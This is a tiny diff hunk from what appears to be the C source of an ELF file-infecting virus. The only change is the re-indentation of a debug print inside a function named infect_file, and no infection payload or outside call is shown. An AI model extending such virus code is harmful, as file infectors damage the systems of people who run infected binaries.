@@ -38,7 +38,7 @@ uint8_t	*infect_file(void *file, size_t file_size, void *start_virus)
 {
 	Elf64_Phdr *phdr;
 
-		printf("%s\n", __func__);
+	printf("%s\n", __func__);
 	(void)start_virus;
 	if (check_elf_header(file, file_size) == FAILURE)
 		return NULL;
